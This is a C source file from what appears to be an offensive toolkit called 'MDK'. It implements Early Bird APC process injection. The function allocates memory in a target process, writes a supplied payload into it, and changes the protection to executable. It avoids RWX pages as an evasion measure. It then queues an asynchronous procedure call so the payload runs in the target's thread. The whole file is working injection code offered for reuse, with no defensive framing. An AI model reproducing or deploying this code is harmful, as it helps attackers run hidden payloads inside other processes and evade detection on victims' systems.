// MDK
// docs    : https://sebafvs.com/mdk/apc
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/nt.h"

MDK_RESULT mdk_early_bird_apc(IN PROCESS_INFORMATION pi, IN const BYTE* payload, IN SIZE_T size) {

    // Alloc RW in target, write payload, flip to RX. Never RWX at rest.
    PVOID remote = NULL;
    MDK_CHECK(mdk_alloc(pi.hProcess, size, PAGE_READWRITE, &remote));

    MDK_RESULT r = mdk_write(pi.hProcess, remote, payload, size);
    if (MDK_FAIL(r)) {
        mdk_free(pi.hProcess, remote);
        return r;
    }

    DWORD old_prot = 0;
    r = mdk_protect(pi.hProcess, remote, size, PAGE_EXECUTE_READ, &old_prot);
    if (MDK_FAIL(r)) {
        mdk_free(pi.hProcess, remote);
        return r;
    }

    return mdk_queue_apc(pi.hThread, remote, NULL);
}
